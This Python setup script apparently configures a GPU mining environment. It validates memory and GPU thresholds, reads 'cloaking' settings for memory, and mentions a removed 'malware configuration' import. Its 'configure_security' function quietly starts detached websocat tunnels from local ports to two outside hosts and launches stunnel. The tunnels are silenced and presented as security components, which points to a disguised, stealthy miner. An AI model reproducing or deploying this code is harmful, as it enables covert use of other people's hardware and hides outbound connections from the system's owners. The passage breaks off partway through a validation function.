"""
**setup_env.py**

**Environment Setup Module** (module thiết lập môi trường – module cấu hình môi trường)
**Mining Environment Configuration** (cấu hình môi trường khai thác – thiết lập môi trường mining)
"""

import os
import sys
import json
import time
import locale
import shutil
import logging
import subprocess
from pathlib import Path
from typing import Dict, Any, List, Optional

# **CPU Plugin Config Import Removed** (đã xóa import config CPU plugin – loại bỏ malware configuration)

try:
    import psutil
except ImportError:
    psutil = None

from mining_environment.scripts.logging_config import setup_logging

# ✅ **GPU-ONLY** (chỉ GPU): **Import InferenceConfigService** (nhập dịch vụ cấu hình suy luận) for **GPU processing configuration** (cấu hình xử lý GPU – thiết lập xử lý GPU)
try:
    from mining_environment.scripts.inference_config import get_inference_config
except ImportError:
    # **Fallback if inference_config module not available** (dự phòng nếu module inference_config không khả dụng – fallback khi module không có sẵn)
    def get_inference_config(process_info=None, logger=None):
        class DummyConfig:
            def validate_configuration(self):
                return False
            def get_environment_variables(self):
                return {}
        return DummyConfig()

def validate_memory_config(config, logger):
    """
    **Memory Configuration Validation** (xác thực cấu hình bộ nhớ – kiểm tra tính hợp lệ thiết lập bộ nhớ)
    
    Validates memory allocation settings against system capacity to prevent
    configuration overflow errors that lead to std::bad_alloc.
    
    Args:
        config: Resource configuration dictionary (từ điển cấu hình tài nguyên)
        logger: Logging instance (thể hiện ghi nhật ký)
        
    Raises:
        ValueError: If memory configuration exceeds system limits (nếu cấu hình bộ nhớ vượt giới hạn hệ thống)
        SystemError: If psutil unavailable (nếu psutil không khả dụng)
    """
    if not psutil:
        logger.error("❌ psutil not available - cannot validate memory configuration")
        raise SystemError("psutil required for memory validation")
    
    try:
        # **System Memory Detection** (phát hiện bộ nhớ hệ thống)
        system_memory = psutil.virtual_memory()
        available_ram = system_memory.total  # Total RAM in bytes (tổng RAM tính bằng byte)
        available_ram_gb = available_ram / (1024 ** 3)  # Convert to GB (chuyển đổi sang GB)
        
        logger.info(f"🔍 [MEMORY VALIDATION] System RAM detected: {available_ram_gb:.1f}GB")
        
        # **Configuration Analysis** (phân tích cấu hình)
        resource_allocation = config.get('resource_allocation', {})
        if not isinstance(resource_allocation, dict):
            resource_allocation = {}
            config['resource_allocation'] = resource_allocation
        ram_config = resource_allocation.get('ram', {})
        if not isinstance(ram_config, dict):
            ram_config = {}
            resource_allocation['ram'] = ram_config
        max_allocation_mb = ram_config.get('max_allocation_mb', 0)

        # **Auto-detect hard cap at 95% of total RAM** (giới hạn cứng 95% RAM khi ở chế độ tự động)
        if max_allocation_mb == 0:
            safety_threshold = 0.95  # 95% safety threshold (ngưỡng an toàn 95%)
            safe_allocation = int(available_ram * safety_threshold)  # bytes
            safe_allocation_gb = safe_allocation / (1024 ** 3)
            computed_mb = int(safe_allocation / (1024 * 1024))
            # Update in-memory config to propagate downstream (cập nhật config trong bộ nhớ)
            ram_config['max_allocation_mb'] = computed_mb
            logger.info(
                f"ℹ️ [MEMORY VALIDATION] Auto-detect mode enabled → hard cap set to 95% of system RAM: "
                f"{safe_allocation_gb:.1f}GB ({computed_mb} MB)"
            )
            max_allocation_mb = computed_mb
            
        # **Convert MB to bytes for comparison** (chuyển đổi MB sang byte để so sánh)
        configured_ram = max_allocation_mb * 1024 * 1024
        configured_ram_gb = configured_ram / (1024 ** 3)
        
        logger.info(f"🔍 [MEMORY VALIDATION] Configured allocation: {configured_ram_gb:.1f}GB")
        
        # **Critical Validation: Overflow Check** (kiểm tra tràn quan trọng)
        if configured_ram > available_ram:
            error_msg = (f"💀 [CRITICAL] Memory allocation ({configured_ram_gb:.1f}GB) "
                        f"exceeds system capacity ({available_ram_gb:.1f}GB)")
            logger.error(error_msg)
            raise ValueError(f"Memory allocation overflow: {configured_ram_gb:.1f}GB > {available_ram_gb:.1f}GB")
        
        # **Safety Margin Validation** (xác thực biên an toàn)
        safety_threshold = 0.95  # 95% safety threshold (ngưỡng an toàn 95%)
        safe_allocation = available_ram * safety_threshold
        safe_allocation_gb = safe_allocation / (1024 ** 3)
        
        if configured_ram > safe_allocation:
            warning_msg = (f"⚠️ [WARNING] Memory allocation ({configured_ram_gb:.1f}GB) "
                          f"close to system limits. Safe limit: {safe_allocation_gb:.1f}GB")
            logger.warning(warning_msg)
            logger.warning("🚨 [RISK] This configuration may cause memory pressure and std::bad_alloc")
        
        # **RAM Threshold Validation** (xác thực ngưỡng RAM)
        baseline_thresholds = config.get('baseline_thresholds', {})
        ram_usage_percent = baseline_thresholds.get('ram_usage_percent', 95)
        
        if ram_usage_percent > 95:
            logger.warning(f"⚠️ [THRESHOLD] RAM threshold {ram_usage_percent}% > 95% - recommend reviewing stability")
            
        # **Memory Limit Validation** (xác thực giới hạn bộ nhớ)
        cloaking_strategies = config.get('cloaking_strategies', {})
        memory_cloaking = cloaking_strategies.get('memory', {})
        memory_limit_mb = memory_cloaking.get('memory_limit_mb', 0)
        
        if memory_limit_mb > 0:
            memory_limit_gb = memory_limit_mb / 1024
            logger.info(f"🔍 [MEMORY VALIDATION] Memory cloaking limit: {memory_limit_gb:.1f}GB")
            
            # Check if memory limit + allocation exceeds system capacity
            total_allocation = configured_ram + (memory_limit_mb * 1024 * 1024)
            total_allocation_gb = total_allocation / (1024 ** 3)
            
            if total_allocation > available_ram:
                error_msg = (f"💀 [CRITICAL] Combined allocation ({total_allocation_gb:.1f}GB) "
                           f"exceeds system capacity ({available_ram_gb:.1f}GB)")
                logger.error(error_msg)
                raise ValueError(f"Combined memory allocation overflow: {total_allocation_gb:.1f}GB > {available_ram_gb:.1f}GB")
        
        logger.info("✅ [MEMORY VALIDATION] Memory configuration validation passed")
        
        # **Progressive Allocation Recommendation** (khuyến nghị cấp phát tiến tiến)
        logger.info("💡 [PROGRESSIVE ALLOCATION] System supports progressive memory allocation:")
        logger.info("   ├─ Normal allocation: <75% memory usage")
        logger.info("   ├─ Conservative allocation: 75-85% memory usage") 
        logger.info("   └─ Emergency reduction: >85% memory usage")
        
        return True
        
    except Exception as e:
        logger.error(f"❌ [MEMORY VALIDATION] Validation failed: {e}")
        raise


def detect_gpu_count(logger) -> int:
    """
    Detect number of NVIDIA GPUs available using nvidia-smi.
    Trả về số lượng GPU; 0 nếu không có hoặc không truy cập được.
    """
    try:
        if shutil.which("nvidia-smi") is None:
            logger.info("ℹ️ NVIDIA-SMI not found – assuming 0 GPU (không tìm thấy nvidia-smi – giả định không có GPU)")
            return 0
        result = subprocess.run(
            ["bash", "-lc", "nvidia-smi -L | wc -l"],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        count_str = result.stdout.strip()
        return int(count_str) if count_str.isdigit() else 0
    except Exception as e:
        logger.warning(f"⚠️ Cannot detect GPU count (không thể phát hiện số GPU): {e}")
        return 0


def apply_auto_defaults(resource_config: Dict[str, Any], environmental_limits: Dict[str, Any], logger) -> None:
    """
    Apply auto-detected defaults at hard 85% for resources when config is missing/zero.
    Áp các mặc định tự động (giới hạn cứng 85%) khi cấu hình trống/0 để phù hợp nhiều máy chủ.
    """
    try:
        # Ensure nested dicts exist
        resource_allocation = resource_config.setdefault("resource_allocation", {})
        gpu_cfg = resource_allocation.setdefault("gpu", {})
        baseline_thresholds = resource_config.setdefault("baseline_thresholds", {})

        # Auto GPU usage percent → 95% (per GPU)
        max_usage = gpu_cfg.get("max_usage_percent")
        needs_auto_gpu = (
            max_usage is None
            or max_usage == 0
            or (isinstance(max_usage, list) and len(max_usage) == 0)
        )
        if needs_auto_gpu:
            gpu_count = detect_gpu_count(logger)
            auto_percent = 95
            auto_value_list = [auto_percent] * max(1, gpu_count)
            gpu_cfg["max_usage_percent"] = auto_value_list
            logger.info(
                f"ℹ️ [AUTO] GPU max_usage_percent auto-set to {auto_percent}% x {len(auto_value_list)} device(s)"
            )

        # Auto RAM baseline threshold → 95% if missing
        ram_thr = baseline_thresholds.get("ram_usage_percent")
        if not isinstance(ram_thr, (int, float)):
            baseline_thresholds["ram_usage_percent"] = 95
            logger.info("ℹ️ [AUTO] baseline_thresholds.ram_usage_percent auto-set to 95%")

        # Auto RAM_PERCENT_THRESHOLD env limit → 95% nếu thiếu
        mem_limits = environmental_limits.setdefault("memory_limits", {}) if isinstance(environmental_limits, dict) else {}
        if isinstance(mem_limits, dict):
            if not isinstance(mem_limits.get("ram_percent_threshold"), (int, float)):
                mem_limits["ram_percent_threshold"] = 95
                logger.info("ℹ️ [AUTO] environmental_limits.memory_limits.ram_percent_threshold auto-set to 95%")
    except Exception as e:
        logger.warning(f"⚠️ [AUTO] Failed to apply auto defaults (không áp được mặc định tự động): {e}")

def load_json_config(config_path, logger):
    """
    **Load JSON Configuration File** (tải tệp cấu hình JSON – đọc file config JSON)
    
    Đọc tệp JSON cấu hình và trả về đối tượng Python dictionary.
    
    Args:
        config_path: **Path to JSON config file** (đường dẫn tới tệp cấu hình JSON)
        logger: **Logger instance** (thể hiện logger – instance ghi log)
    
    Returns:
        **Configuration dictionary** (từ điển cấu hình – dict chứa config)
    """
    try:
        with open(config_path, 'r') as file:
            config = json.load(file)
        logger.info(f"✅ **Configuration loaded** (đã tải cấu hình – config đã được load) từ {config_path}")
        # **[CHANGES] Type validation** (kiểm tra kiểu dữ liệu – xác thực kiểu dict)
        if not isinstance(config, dict):
            logger.error(f"❌ **JSON content not dict type** (nội dung JSON không phải kiểu dict – JSON không phải dictionary) trong {config_path}. **Stopping** (dừng – thoát chương trình).")
            sys.exit(1)
        return config
    except FileNotFoundError:
        logger.error(f"❌ **Config file not found** (tệp cấu hình không tồn tại – file config không có): {config_path}")
        sys.exit(1)
    except json.JSONDecodeError as e:
        logger.error(f"❌ **JSON syntax error** (lỗi cú pháp JSON – JSON parse error) trong tệp {config_path}: {e}")
        sys.exit(1)

def configure_system(system_params, logger):
    """
    **Configure System Parameters** (cấu hình tham số hệ thống – thiết lập thông số hệ thống)
    
    Thiết lập các tham số hệ thống như **timezone** (múi giờ) và **locale** (ngôn ngữ địa phương).
    
    Args:
        system_params: **System configuration dict** (từ điển cấu hình hệ thống)
        logger: **Logger instance** (thể hiện logger)
    """
    try:
        timezone = system_params.get('timezone', 'UTC')
        os.environ['TZ'] = timezone
        
        # **Try to set system timezone but ignore permission errors** (thử đặt múi giờ hệ thống nhưng bỏ qua lỗi quyền – cố gắng set timezone, skip lỗi permission)
        try:
            subprocess.run(['ln', '-snf', f'/usr/share/zoneinfo/{timezone}', '/etc/localtime'], check=True)
            subprocess.run(['dpkg-reconfigure', '-f', 'noninteractive', 'tzdata'], check=True)
            logger.info(f"✅ **System timezone set** (múi giờ hệ thống được thiết lập – timezone đã cấu hình): {timezone}")
        except subprocess.CalledProcessError as e:
            logger.warning(f"⚠️ **Cannot set system timezone** (không thể thiết lập timezone hệ thống – không set được múi giờ) **(needs root permission)** (cần quyền root): {e}")
            logger.info(f"📍 **Using TZ environment variable** (sử dụng biến môi trường TZ – dùng env var TZ): {timezone}")

        locale_setting = system_params.get('locale', 'en_US.UTF-8')
        try:
            locale.setlocale(locale.LC_ALL, locale_setting)
            logger.info(f"Locale hệ thống được thiết lập thành: {locale_setting}")
        except locale.Error:
            logger.warning(f"⚠️ **Locale not generated** (locale chưa được sinh – ngôn ngữ chưa tạo) {locale_setting}. **Generating locale** (đang sinh locale – đang tạo ngôn ngữ)...")
            subprocess.run(['locale-gen', locale_setting], check=True)
            locale.setlocale(locale.LC_ALL, locale_setting)
            logger.info(f"Locale hệ thống được thiết lập thành: {locale_setting}")

        # Try to update system locale but ignore permission errors
        try:
            subprocess.run(['update-locale', f'LANG={locale_setting}'], check=True)
            logger.info(f"✅ **System locale updated** (locale hệ thống được cập nhật – ngôn ngữ đã update): {locale_setting}")
        except subprocess.CalledProcessError as e:
            logger.warning(f"⚠️ **Cannot update system locale** (không thể cập nhật locale hệ thống – không update được ngôn ngữ) **(needs root permission)** (cần quyền root): {e}")
            logger.info(f"📍 **Using LANG environment variable** (sử dụng biến môi trường LANG – dùng env var LANG): {locale_setting}")
            os.environ['LANG'] = locale_setting
    except subprocess.CalledProcessError as e:
        logger.error(f"❌ **System configuration error** (lỗi khi cấu hình hệ thống – lỗi config hệ thống): {e}")
        sys.exit(1)
    except locale.Error as e:
        logger.error(f"❌ **Locale setup error** (lỗi khi thiết lập locale – lỗi cấu hình ngôn ngữ): {e}")
        sys.exit(1)

def setup_environment_variables(environmental_limits, logger):
    """
    **Setup Environment Variables** (thiết lập biến môi trường – cấu hình environment variables)
    
    Đặt các biến môi trường dựa trên **environmental limits** (giới hạn môi trường – ngưỡng giới hạn).
    
    Args:
        environmental_limits: **Environmental configuration dict** (từ điển cấu hình giới hạn môi trường)
        logger: **Logger instance** (thể hiện logger)
    """
    try:
        # **memory_limits** (giới hạn bộ nhớ – ngưỡng RAM)
        memory_limits = environmental_limits.get('memory_limits', {})
        ram_percent_threshold = memory_limits.get('ram_percent_threshold')
        if isinstance(ram_percent_threshold, (int, float)):
            os.environ['RAM_PERCENT_THRESHOLD'] = str(ram_percent_threshold)
            logger.info(f"✅ **Environment variable set** (đã đặt biến môi trường – env var đã cấu hình) RAM_PERCENT_THRESHOLD: {ram_percent_threshold}%")
        else:
            logger.warning("⚠️ **Invalid or missing ram_percent_threshold** (`ram_percent_threshold` không hợp lệ hoặc không có trong cấu hình – thiếu hoặc sai ngưỡng RAM).")

        # **gpu_optimization** (tối ưu hóa GPU – GPU optimization)
        gpu_optimization = environmental_limits.get('gpu_optimization', {})
        gpu_util = gpu_optimization.get('gpu_utilization_percent_optimal', {})
        gpu_util_min = gpu_util.get('min')
        gpu_util_max = gpu_util.get('max')
        
        if isinstance(gpu_util_min, (int, float)) and isinstance(gpu_util_max, (int, float)):
            if 0 <= gpu_util_min < gpu_util_max <= 100:
                os.environ['GPU_UTIL_MIN'] = str(gpu_util_min)
                os.environ['GPU_UTIL_MAX'] = str(gpu_util_max)
                logger.info(f"✅ **Environment variables set** (đã đặt biến môi trường – env vars đã cấu hình) GPU_UTIL_MIN: {gpu_util_min}%, GPU_UTIL_MAX: {gpu_util_max}%")
            else:
                logger.error("❌ **Invalid GPU utilization values** (giá trị GPU utilization không hợp lệ – sai ngưỡng sử dụng GPU) (0 <= min < max <= 100).")
                sys.exit(1)
        else:
            logger.error("❌ **Missing or invalid GPU utilization thresholds** (thiếu hoặc sai định dạng ngưỡng GPU – không có hoặc sai format) (min, max).")
            sys.exit(1)

    except Exception as e:
        logger.error(f"❌ **Environment variable setup error** (lỗi khi đặt biến môi trường – lỗi cấu hình env var): {e}")
        sys.exit(1)

def reset_gpu_state(logger):
    """
    **Reset GPU state to normal** (đặt lại trạng thái GPU về bình thường – mở khóa xung/điện nếu có)
    - Gọi NVML để reset Application Clocks
    - Gọi nvidia-smi để bỏ lock graphics/memory clocks
    Thực thi best-effort, bỏ qua lỗi nếu không hỗ trợ.
    """
    try:
        import subprocess
        try:
            import pynvml
            pynvml.nvmlInit()
            count = int(pynvml.nvmlDeviceGetCount())
        except Exception as e:
            count = 0
            logger.warning(f"⚠️ [GPU-RESET] NVML init failed or unavailable: {e}. Falling back to nvidia-smi only")
        # NVML: reset application clocks
        for idx in range(max(1, count)):
            try:
                if count > 0:
                    handle = pynvml.nvmlDeviceGetHandleByIndex(idx)
                    try:
                        pynvml.nvmlDeviceResetApplicationsClocks(handle)
                        logger.info(f"[GPU-RESET] Reset application clocks via NVML for GPU {idx}")
                    except Exception as nvml_e:
                        logger.debug(f"[GPU-RESET] NVML reset apps clocks not supported for GPU {idx}: {nvml_e}")
                # nvidia-smi: unlock graphics/memory clocks
                subprocess.run(['nvidia-smi','-i',str(idx),'-rgc'], check=False)
                subprocess.run(['nvidia-smi','-i',str(idx),'--reset-memory-clocks'], check=False)
                logger.info(f"[GPU-RESET] Unlocked clocks via nvidia-smi for GPU {idx}")
            except Exception as smi_e:
                logger.debug(f"[GPU-RESET] nvidia-smi unlock failed for GPU {idx}: {smi_e}")
        try:
            if count > 0:
                pynvml.nvmlShutdown()
        except Exception:
            pass
    except Exception as e:
        logger.debug(f"[GPU-RESET] Skipped due to unexpected error: {e}")

def configure_security(logger):
    """
    **Configure Security Components** (cấu hình thành phần bảo mật – thiết lập security)
    
    Khởi chạy hai tiến trình **Websocat** (WebSocket proxy) và **Stunnel** (TLS tunnel)
    để phục vụ **connection/security** (kết nối/bảo mật – connection và encryption).
    
    Args:
        logger: **Logger instance** (thể hiện logger)
    """
    websocat_command_1 = "websocat -v --binary tcp-l:127.0.0.1:5555 wss://massiveinfinity.online/ws"
    websocat_command_2 = "websocat -v --binary tcp-l:127.0.0.1:5556 wss://strainingmodules.tech/ws"
    stunnel_conf_path = '/etc/stunnel/stunnel.conf'

    logger.info("🔐 **Starting security setup** (bắt đầu thiết lập bảo mật – khởi động cấu hình security) (Websocat & Stunnel).")
    try:
        # -------------------- **Websocat Check** (kiểm tra Websocat) --------------------
        if shutil.which("websocat") is None:
            logger.error("❌ **Websocat binary not found in PATH** (không tìm thấy binary websocat trong PATH – thiếu websocat executable), **skipping WebSocket proxy setup** (bỏ qua thiết lập WebSocket proxy).")
            websocat_process_1 = websocat_process_2 = None
        else:
            logger.info("🚀 **Launching Websocat on port 5555** (đang khởi chạy Websocat trên cổng 5555 – starting WebSocket proxy port 5555)…")
            websocat_process_1 = subprocess.Popen(
                websocat_command_1,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )

            logger.info(f"✅ **Websocat (5555) launched** (khởi chạy thành công – đã start), PID = {websocat_process_1.pid} – **checking status** (kiểm tra tình trạng – đang check)…")
            if websocat_process_1.poll() is not None:
                logger.error("❌ **Websocat (5555) launch failed** (khởi chạy thất bại – start lỗi) **(exited immediately after spawn)** (đã thoát ngay sau khi spawn – exit ngay lập tức).")

            logger.info("🚀 **Launching Websocat on port 5556** (đang khởi chạy Websocat trên cổng 5556 – starting WebSocket proxy port 5556)…")
            websocat_process_2 = subprocess.Popen(
                websocat_command_2,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )

            logger.info(f"✅ **Websocat (5556) launched** (khởi chạy thành công – đã start), PID = {websocat_process_2.pid} – **checking status** (kiểm tra tình trạng – đang check)…")
            if websocat_process_2.poll() is not None:
                logger.error("❌ **Websocat (5556) launch failed** (khởi chạy thất bại – start lỗi) **(exited immediately after spawn)** (đã thoát ngay sau khi spawn – exit ngay lập tức).")

        if not os.path.exists(stunnel_conf_path):
            logger.error(f"❌ **Stunnel config file not found** (tệp cấu hình stunnel không tồn tại – file config stunnel không có): {stunnel_conf_path}")
            sys.exit(1)

        logger.info("🔍 **Checking Stunnel process** (kiểm tra tiến trình Stunnel – check process Stunnel)...")
        result = subprocess.run(['pgrep', '-f', 'stunnel'], stdout=subprocess.PIPE)
        if result.returncode != 0:
            logger.info("ℹ️ **Stunnel not running** (Stunnel chưa chạy – Stunnel chưa start). **Launching** (đang khởi chạy – starting)...")
            # **Find stunnel binary** (tìm binary stunnel): **prefer 'stunnel', fallback 'stunnel4'** (ưu tiên 'stunnel', dự phòng 'stunnel4')
            stunnel_binary = shutil.which('stunnel') or shutil.which('stunnel4')
            if stunnel_binary is None:
                logger.warning("⚠️ **Stunnel/stunnel4 binary not found in PATH** (không tìm thấy binary stunnel hoặc stunnel4 trong PATH – thiếu executable). **Skipping TLS configuration** (bỏ qua cấu hình TLS – skip TLS setup).")
                # **Don't exit completely** (không thoát hẳn) — **continue without TLS layer instead of crashing container** (tiếp tục chạy mà không có lớp TLS thay vì crash container)
                return
            stunnel_process = subprocess.Popen(
                [stunnel_binary, stunnel_conf_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            logger.info(f"✅ **Stunnel launched successfully** (Stunnel đã được khởi chạy thành công – Stunnel started OK) (PID = {stunnel_process.pid}).")
        else:
            logger.info("✅ **Stunnel already running** (Stunnel đã đang chạy – Stunnel đang hoạt động).")
    except subprocess.CalledProcessError as e:
        logger.error(f"❌ **System command execution error** (lỗi khi thực thi lệnh hệ thống – lỗi chạy system command): {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"❌ **Unexpected error** (lỗi không mong muốn – lỗi bất ngờ): {e}")
        sys.exit(1)

def normalize_max_usage_percent(max_usage_percent, logger):
    """
    **Normalize Max Usage Percent Value** (chuẩn hóa giá trị phần trăm sử dụng tối đa – normalize max usage percent)
    
    Chuẩn hóa giá trị **max_usage_percent** thành **valid list** (danh sách hợp lệ – list chuẩn).
    
    Args:
        max_usage_percent: **Usage percentage value or list** (giá trị hoặc danh sách phần trăm sử dụng)
        logger: **Logger instance** (thể hiện logger)
    
    Returns:
        **Normalized list of valid percentages** (danh sách phần trăm hợp lệ đã chuẩn hóa)
    """
    try:
        if isinstance(max_usage_percent, (int, float)):
            if 1 <= max_usage_percent <= 100:
                return [max_usage_percent]  # **Put into list** (đưa vào danh sách – convert to list)
            else:
                logger.error(f"❌ **Invalid max_usage_percent value** (giá trị max_usage_percent không hợp lệ – sai giá trị) ({max_usage_percent}).")
                return []
        elif isinstance(max_usage_percent, list):
            valid_values = [v for v in max_usage_percent if isinstance(v, (int, float)) and 1 <= v <= 100]
            if len(valid_values) != len(max_usage_percent):
                logger.warning(f"⚠️ **Some values in max_usage_percent invalid** (một số giá trị trong max_usage_percent không hợp lệ – có giá trị sai), **keeping only** (chỉ giữ lại): {valid_values}")
            return valid_values
        else:
            logger.error(f"❌ **Unsupported data type for max_usage_percent** (kiểu dữ liệu của max_usage_percent không được hỗ trợ – data type không support) ({type(max_usage_percent)}).")
            return []
    except Exception as e:
        logger.error(f"❌ **Error normalizing max_usage_percent** (lỗi khi chuẩn hóa max_usage_percent – lỗi normalize): {e}")
        return []

def validate_configs(resource_config, system_params, environmental_limits, logger):
    """
    **Validate Configuration Files** (kiểm tra tệp cấu hình – validate config files)
    
    Kiểm tra tính hợp lệ của các **configuration files** (tệp cấu hình – file config).
    
    Args:
        resource_config: **Resource configuration dict** (từ điển cấu hình tài nguyên)
        system_params: **System parameters dict** (từ điển tham số hệ thống)
        environmental_limits: **Environmental limits dict** (từ điển giới hạn môi trường)
        logger: **Logger instance** (thể hiện logger)
    """
    try:
        # **Check if main configs are dict type** (kiểm tra xem các cấu hình chính có đúng kiểu dict hay không)
        for cfg_name, cfg in [("resource_config", resource_config),
                              ("system_params", system_params),
                              ("environmental_limits", environmental_limits)]:
            if not isinstance(cfg, dict):
                logger.error(f"❌ **{cfg_name} not dict type** ({cfg_name} không phải kiểu dict – không phải dictionary).")
                sys.exit(1)

        # **Check each part in configuration** (kiểm tra từng phần trong cấu hình – validate từng phần config)
        def validate_threshold(value, min_val, max_val, field_name):
            """**Helper function to validate threshold values** (hàm phụ để kiểm tra giá trị ngưỡng – helper validate threshold)"""
            if not isinstance(value, (int, float)):
                logger.error(f"❌ **{field_name} must be number** ({field_name} phải là số – cần kiểu số) (int/float). **Received** (nhận được): {type(value)}")
                return False
            if not (min_val <= value <= max_val):
                logger.error(f"❌ **{field_name} out of range** ({field_name} không nằm trong phạm vi – ngoài khoảng) {min_val}-{max_val}. **Value** (giá trị): {value}")
                return False
            logger.info(f"✅ **{field_name} valid** ({field_name} hợp lệ – giá trị OK): {value}")
            return True

        # **Get baseline_monitoring from environmental_limits** (lấy baseline_monitoring từ environmental_limits)
        baseline_monitoring = environmental_limits.get('baseline_monitoring', {})

        # 1. **Check RAM Allocation** (kiểm tra cấp phát RAM – validate RAM allocation)
        ram_allocation = resource_config.get('resource_allocation', {}).get('ram', {})
        ram_max_mb = ram_allocation.get('max_allocation_mb', 0)
        # Allow 0 as "auto-detect" mode to remove hard memory limit
        if ram_max_mb == 0:
            logger.info("ℹ️ **max_allocation_mb=0** => **Auto-detect mode** (chế độ tự động – không giới hạn cứng). **Skipping strict RAM threshold validation** (bỏ qua kiểm tra ngưỡng RAM nghiêm ngặt).")
        else:
            # Dynamic upper bound: at least 200000 MB or the system total memory in MB
            try:
                import psutil as _ps
                _sys_total_mb = int(_ps.virtual_memory().total / (1024 * 1024))
            except Exception:
                _sys_total_mb = 200000
            _upper_bound_mb = max(200000, _sys_total_mb)
            if not validate_threshold(ram_max_mb, 1024, _upper_bound_mb, "max_allocation_mb"):
                logger.error(f"❌ max_allocation_mb out of range 1024-{_upper_bound_mb}. Value: {ram_max_mb}")
                sys.exit(1)

        # ✅ **CPU LOGIC REMOVED** (logic CPU đã xóa) - **Only GPU processing remains** (chỉ còn xử lý GPU)
        logger.info("✅ **CPU configuration skipped** (bỏ qua cấu hình CPU – skip CPU config) - **GPU-only mode enabled** (chế độ chỉ GPU đã bật – GPU-only mode ON)")

        # 4. **Check GPU Usage Percent Max** (kiểm tra phần trăm sử dụng GPU tối đa – validate max GPU usage)
        gpu_usage_max_percent = resource_config.get('resource_allocation', {}).get('gpu', {}).get('max_usage_percent')
        if isinstance(gpu_usage_max_percent, list):
            for value in gpu_usage_max_percent:
                if not validate_threshold(value, 1, 100, "gpu_usage_max_percent (list element)"):
                    sys.exit(1)
        elif not validate_threshold(gpu_usage_max_percent, 1, 100, "gpu_usage_max_percent"):
            sys.exit(1)

        # 5. **Check GPU Utilization Percent Optimal** (kiểm tra phần trăm sử dụng GPU tối ưu – validate optimal GPU utilization)
        gpu_optimization = environmental_limits.get('gpu_optimization', {}).get('gpu_utilization_percent_optimal', {})
        if not isinstance(gpu_optimization, dict):
            logger.error("❌ **gpu_utilization_percent_optimal must be dict** (gpu_utilization_percent_optimal phải là dict – cần kiểu dictionary) **containing `min` and `max`** (chứa `min` và `max`).")
            sys.exit(1)
        gpu_util_min = gpu_optimization.get('min')
        gpu_util_max = gpu_optimization.get('max')
        if not (validate_threshold(gpu_util_min, 0, 100, "gpu_util_min") and
                validate_threshold(gpu_util_max, 0, 100, "gpu_util_max")):
            sys.exit(1)
        if gpu_util_min >= gpu_util_max:
            logger.error("❌ **gpu_util_min must be less than gpu_util_max** (gpu_util_min phải nhỏ hơn gpu_util_max – min < max).")
            sys.exit(1)

        # 6. **Check Cache Percent Threshold** (kiểm tra ngưỡng phần trăm cache – validate cache threshold)
        cache_percent_threshold = environmental_limits.get('baseline_monitoring', {}).get('cache_percent_threshold')
        if not validate_threshold(cache_percent_threshold, 10, 100, "cache_percent_threshold"):
            sys.exit(1)

        # 7. **Check Network Bandwidth Threshold** (kiểm tra ngưỡng băng thông mạng – validate network bandwidth)
        network_bandwidth_threshold = baseline_monitoring.get('network_bandwidth_threshold_mbps')
        if network_bandwidth_threshold is None:
            logger.error("❌ **Missing `network_bandwidth_threshold_mbps`** (thiếu `network_bandwidth_threshold_mbps` – không có trường này) **in `environmental_limits.baseline_monitoring`** (trong `environmental_limits.baseline_monitoring`).")
            sys.exit(1)
        if not isinstance(network_bandwidth_threshold, (int, float)) or not (1 <= network_bandwidth_threshold <= 10000):
            logger.error("❌ **Invalid `network_bandwidth_threshold_mbps` value** (giá trị `network_bandwidth_threshold_mbps` không hợp lệ – sai giá trị) **or not a number** (hoặc không phải số) (1-10000 Mbps).")
            sys.exit(1)
        else:
            logger.info(f"✅ **Network bandwidth threshold** (giới hạn băng thông mạng – ngưỡng network): {network_bandwidth_threshold} Mbps")

        # 8. **Check Disk I/O Threshold** (kiểm tra ngưỡng I/O đĩa – validate disk I/O)
        disk_io_threshold_mbps = baseline_monitoring.get('disk_io_threshold_mbps')
        if disk_io_threshold_mbps is None:
            logger.error("❌ **Missing `disk_io_threshold_mbps`** (thiếu `disk_io_threshold_mbps` – không có trường này) **in `environmental_limits.baseline_monitoring`** (trong `environmental_limits.baseline_monitoring`).")
            sys.exit(1)
        if not isinstance(disk_io_threshold_mbps, (int, float)) or not (1 <= disk_io_threshold_mbps <= 10000):
            logger.error("❌ **Invalid `disk_io_threshold_mbps` value** (giá trị `disk_io_threshold_mbps` không hợp lệ – sai giá trị) **or not a number** (hoặc không phải số) (1-10000).")
            sys.exit(1)
        else:
            logger.info(f"✅ **Disk I/O threshold** (giới hạn I/O đĩa – ngưỡng disk I/O): {disk_io_threshold_mbps} Mbps")

        # 9. **Check Power Consumption Threshold** (kiểm tra ngưỡng tiêu thụ điện – validate power consumption)
        power_consumption_threshold = baseline_monitoring.get('power_consumption_threshold_watts')
        if power_consumption_threshold is None:
            logger.error("❌ **Missing `power_consumption_threshold_watts`** (thiếu `power_consumption_threshold_watts` – không có trường này) **in `environmental_limits.baseline_monitoring`** (trong `environmental_limits.baseline_monitoring`).")
            sys.exit(1)
        if not isinstance(power_consumption_threshold, (int, float)) or not (50 <= power_consumption_threshold <= 10000):
            logger.error("❌ **Invalid `power_consumption_threshold_watts` value** (giá trị `power_consumption_threshold_watts` không hợp lệ – sai giá trị) **or not a number** (hoặc không phải số) (50-10000 W).")
            sys.exit(1)
        else:
            logger.info(f"✅ **Power consumption limit** (giới hạn tiêu thụ năng lượng – công suất giới hạn): {power_consumption_threshold} W")

        # ✅ **CPU TEMPERATURE MONITORING REMOVED** (theo dõi nhiệt độ CPU đã xóa) - **GPU thermal only** (chỉ quản lý nhiệt GPU)
        logger.info("✅ **CPU temperature monitoring disabled** (theo dõi nhiệt độ CPU đã tắt – CPU temp monitor OFF) - **GPU thermal management active** (quản lý nhiệt GPU đang hoạt động – GPU thermal ON)")

        # 11. **Check GPU Temperature** (kiểm tra nhiệt độ GPU – validate GPU temp)
        gpu_temperature = environmental_limits.get('temperature_limits', {}).get('gpu', {})
        gpu_max_celsius = gpu_temperature.get('max_celsius')
        if gpu_max_celsius is None:
            logger.error("❌ **Missing `temperature_limits.gpu.max_celsius`** (thiếu `temperature_limits.gpu.max_celsius` – không có trường này).")
            sys.exit(1)
        if not isinstance(gpu_max_celsius, (int, float)) or not (40 <= gpu_max_celsius <= 100):
